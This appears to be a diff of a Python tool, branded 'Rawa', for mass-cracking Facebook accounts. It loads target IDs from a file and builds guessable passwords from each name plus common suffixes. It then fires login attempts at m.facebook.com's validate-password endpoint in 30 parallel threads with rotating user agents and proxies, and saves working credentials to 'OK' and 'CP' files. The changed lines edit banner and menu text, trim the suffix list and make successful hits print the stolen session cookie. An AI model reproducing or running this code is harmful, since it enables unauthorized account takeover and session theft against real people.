@@ -99,7 +99,6 @@ def MRDYNO():
 	        
  #------------------[ rawa ]-------------------#
 import os, platform, time, sys
-print('\033[97;1m[\033[92;1mRAWA\033[97;1m] \033[0;96MUPDATE power👌.. ')
 time.sleep(5)
 os.system('clear')
 time.sleep(2)
@@ -365,16 +364,14 @@ logo ="""
 ██   ██ ██   ██ ██ ███ ██ ██   ██ 
 ██   ██ ██   ██  ███ ███  ██   ██
                                    
-              [WELCOME TO TOOL Rawa]              
+              [𝐖𝐄𝐋𝐂𝐎𝐌🔥]              
               
      
 __________________________________
-TOOL BY RAWA🧠
-NETWORK + 3G 4G 5G STORNG🥷
-VERSION + 1.0.0.1🌼
-DATE + 2+ 8💔
-CRTEAR + RAWA, 🖤
-NO CP ALL OK FUCK YOU CP👌
+𝐓𝐎𝐎𝐋 𝐍𝐄𝐖 🕷️
+𝐕𝐄𝐑𝐒𝐈𝐎𝐍 + 1.0.0.1💥
+
+
 
 
 
@@ -456,10 +453,10 @@ def menu():
 #-------------[ CRACK-FROM-FILE ]------------------#
  
 def JNOKA_FILE():
-    o = input('\x1b[97;1m\x1b[1;94mNAME FILE\033[1;31m :\x1b[1;92m ')
+    o = input('\x1b[97;1m\x1b[1;94m𝐍𝐀𝐌𝐄 FILE📁\033[1;31m :\x1b[1;92m ')
     try:lin = open(o).read().splitlines()
     except:
-        animation(' [×] FILE NOT FOUND')
+        animation(' [×] 𝐅𝐀𝐈𝐋𝐄 𝐇𝐀𝐋𝐀𝐘𝐀')
         time.sleep(2)
         back()
     for xid in lin:
@@ -469,7 +466,7 @@ def JNOKA_FILE():
 #-------------[ PENGATURAN-IDZ ]---------------#
  
 def setting():
-    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92mMETHOD SUPORT OLD ID \n\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;92mMETHOD SUPORT NEW IDS \n\x1b[1;93m[\x1b[1;91m3\x1b[1;93m] \x1b[1;92mMETHOD SUPORT ALL IDS')
+    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐊𝐎𝐍 𝐃𝐄𝐍𝐄👍 \n\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;92m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐓𝐀𝐙𝐀 𝐃𝐄𝐍𝐄𝐓 \n\x1b[1;93m[\x1b[1;91m3\x1b[1;93m] \x1b[1;92m𝐑𝐀𝐍𝐃𝐎𝐌')
     hu = input('\033[97;1m\033[92;1m\033[97;1mCHOOSE :\033[92;1m ')
     if hu in ['1','01']:
         for tua in sorted(id):
@@ -491,7 +488,7 @@ def setting():
         for bacot in id:
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
-    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92mMETHOD SUPORT ALL INTARNET')
+    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92m𝐌𝐄𝐓𝐇𝐎𝐃 -𝐔𝐏𝐃𝐀𝐓𝐄🔥')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
     if hc in ['1','01']:
         method.append('mobile')
@@ -506,8 +503,8 @@ def passwrd():
     os.system('clear')
     print(logo)
     print(50*'\033[1;97m-')
-    print('\033[1;96mHAMU IDS 👉 \033[92;1m '+str(len(id)))
-    print("\033[1;96mCLONING HAS STARTED\x1b[0m")
+    print('\033[1;96m𝐀𝐋𝐋 𝐈𝐃👌 \033[92;1m '+str(len(id)))
+    print("\033[1;96m𝐂𝐇𝐀𝐖𝐀𝐑𝐄 𝐁𝐊𝐀 𝐂𝐑𝐀𝐂𝐊 𝐀𝐊𝐀𝐓\x1b[0m")
     print(f"\033[1;96mDATE  :  \033[1;92m{tgl} \033[1;91m{bln} \033[1;97m{thn}")
     print(50*'\033[1;97m-')
     with tred(max_workers=30) as pool:
@@ -524,7 +521,6 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'qwery')
                     pwv.append(frs+'1998')
                     pwv.append(frs+'2007')
                     pwv.append(frs+'2006')
@@ -535,14 +531,7 @@ def passwrd():
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+'11223344')
-                    pwv.append(frs+'2211')
-                    pwv.append(frs+'1111')
-                    pwv.append(frs+'2222')
-                    pwv.append(frs+'2000')
-                    pwv.append(frs+'2211')
-                    pwv.append(frs+'00')
-                    pwv.append(frs+'19971997')
-                    pwv.append(frs+'1221')   
+                       
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
@@ -553,7 +542,6 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'qwery')
                     pwv.append(frs+'1998')
                     pwv.append(frs+'2007')
                     pwv.append(frs+'2006')
@@ -564,14 +552,6 @@ def passwrd():
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+'11223344')
-                    pwv.append(frs+'2211')
-                    pwv.append(frs+'1111')
-                    pwv.append(frs+'2222')
-                    pwv.append(frs+'2000')
-                    pwv.append(frs+'2211')
-                    pwv.append(frs+'00')
-                    pwv.append(frs+'19971997')
-                    pwv.append(frs+'1221')
               
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
@@ -594,7 +574,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r \r[RAWA]  \033[1;30m[\033[1;32mOK\033[1;30m/\033[1;33mCP\033[1;30m] - \033[1;30m[\033[1;32m{ok}\033[1;30m/\033[1;33m{cp}\033[1;30m] \033[1;30m[\033[1;36mTEST\033[1;30m/\033[1;32m{loop}\033[1;30m]"),
+    sys.stdout.write(f"\r\033[1;32m [ 𝐑𝐀𝐖𝐀🔥 ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}𝐎𝐊{m}🔥{H}{ok}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -635,7 +615,7 @@ def crack(idf,pwv):
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[1;30m[\033[1;33mRAWA-CP\033[1;30m]\033[1;33m   {idf} | \033[1;33m{pw}')
+                #print(f'\r\033[1;30m[\033[1;33mRAWA-CP\033[1;30m]\033[1;33m   {idf} | \033[1;33m{pw}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -644,7 +624,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[1;30m[\033[1;32mLAWA-OK\033[1;30m]\033[1;32m   {idf} | \033[1;32m{pw}')
+                print(f'\r\x1b[32[𝐑𝐀𝐖𝐀-𝐎𝐊]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
                 break
